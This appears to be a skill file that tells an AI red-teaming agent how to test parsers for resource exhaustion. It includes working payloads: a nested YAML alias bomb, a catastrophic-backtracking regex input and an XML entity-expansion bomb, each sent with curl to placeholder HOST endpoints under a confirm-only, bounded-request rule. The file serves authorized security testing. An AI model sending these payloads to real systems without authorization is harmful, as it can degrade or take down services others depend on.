---
name: resource-exhaustion-testing
description: Safely test parser bombs, regex ReDoS, and resource-exhaustion denial-of-service without taking a target down
origin: RedteamOpencode
---

# Resource Exhaustion & Parser Bomb Testing

## When to Activate

- A parser evaluates untrusted YAML, JSON, XML, archive, or regex input server-side
- The task is to prove a bounded resource-exhaustion or algorithmic-complexity weakness without causing an outage
- A prior finding names a parser or a DoS-adjacent sink (evaluation, deserialization, upload, or query)

## Tools

`run_tool curl`, `python3`, `awk`, `grep`, `sed`, `printf`

## Methodology

### 1. Identify the Parser and Its Bound

Determine which parser consumes the input and what limit protects it (timeout, size cap, entity/alias limit). Record the parser name and any observed guard; do not probe until the input format and endpoint are concrete.

```bash
printf '%s\n' 'a: [x, x, x]' > "$DIR/scans/baseline.yml"
run_tool curl -sS --connect-timeout 5 --max-time 20 -D "$DIR/scans/exhaust_headers.txt" \
  -F "file=@$DIR/scans/baseline.yml" https://HOST/file-upload -o "$DIR/scans/exhaust_baseline.body"
```

The baseline establishes the parser's normal behavior and error shape; a changed error on a later payload is the differential, not a finding on its own.

### 2. Test a YAML Alias Bomb (bounded)

Upload one nested alias-expansion document and observe whether the parser caps expansion or degrades gracefully. Never exceed a depth that would persist after the request.

```bash
printf '%s\n' \
  'a: &a ["x","x","x","x","x","x","x","x","x","x"]' \
  'b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a,*a]' \
  'c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b,*b]' \
  'd: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c,*c]' \
  'e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d,*d]' \
  > "$DIR/scans/yaml_bomb.yml"
run_tool curl -sS --connect-timeout 5 --max-time 20 -F "file=@$DIR/scans/yaml_bomb.yml" \
  https://HOST/file-upload -D "$DIR/scans/yaml_bomb.headers" -o "$DIR/scans/yaml_bomb.body"
```

Report a weakness only if the parser throws an out-of-memory / invalid-length error or times out; a graceful rejection (size or alias limit) is the correct behavior and not a finding.

### 3. Test Regex ReDoS (single differential)

Run one known-catastrophic pattern against a matching input once. Record the response time and status; treat a clear latency/status differential as evidence, not a DoS claim.

```bash
printf '%s\n' '/((a+)+)b/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!' > "$DIR/scans/regex_redos.txt"
run_tool curl -sS --connect-timeout 5 --max-time 20 -w 'regex_redos %{http_code} %{time_total}\n' \
  --data-urlencode "q=$(cat "$DIR/scans/regex_redos.txt")" https://HOST/search \
  -o "$DIR/scans/regex_redos.body"
```

A slow response is evidence of backtracking only when the same endpoint returns quickly on a non-matching input; compare against a control request first.

### 4. Test XML Entity Expansion and Oversized Payloads

Send one recursive-entity XML and one oversized-but-legal payload, each once, and record whether the parser caps them. Never exceed the application's documented limits.

```bash
printf '%s\n' '<?xml version="1.0"?>' '<!DOCTYPE a [<!ENTITY x "xxxx">' \
  '<!ENTITY x2 "&x;&x;&x;&x;&x;&x;&x;&x;&x;&x;">' \
  '<!ENTITY x3 "&x2;&x2;&x2;&x2;&x2;&x2;&x2;&x2;&x2;&x2;">]>' \
  '<a>&x3;</a>' > "$DIR/scans/xml_bomb.xml"
run_tool curl -sS --connect-timeout 5 --max-time 20 -H 'Content-Type: application/xml' \
  --data-binary @"$DIR/scans/xml_bomb.xml" https://HOST/parse -D "$DIR/scans/xml_bomb.headers" -o "$DIR/scans/xml_bomb.body"
```

A parser cap or size rejection is correct hardening; an unbounded expansion is the finding.

### 5. Classify and Hand Off

Separate "guard held" (correct) from "unbounded degradation" (weakness), and record the exact payload and the differential. Confirm-only: never run a sustained, repeated, or production-impacting load. A timeout or latency is an observation until the same payload reproduces it against a control.

```bash
printf '%s\n' \
  "parser: name + endpoint" \
  "bound: timeout | size cap | entity/alias limit | none" \
  "differential: graceful rejection vs. unbounded degradation" \
  "impact: only a reproduced, bounded resource-exhaustion differential" \
  > "$DIR/scans/exhaust_handoff.txt"
```

## References

`references/vuln-checklists/A04-cryptographic-failures.md`, `references/vuln-checklists/A10-exceptional-conditions.md`, `references/api-security/API04-resource-consumption.md`, `references/handoff-protocols.md`.

## Confirm-Only Rule

Every probe is bounded and single-shot. A parser bomb, regex, or oversized payload is evidence of a weakness only with a reproducible differential against a control request; a graceful cap or rejection is correct behavior. Never run a sustained, repeated, or production-impacting load, and never leave a target in a degraded state.

## Budget

One payload per parser class, at most 6 requests per endpoint, and 10 minutes wall-clock; no repeated streams, no sustained load, no persistent state change.
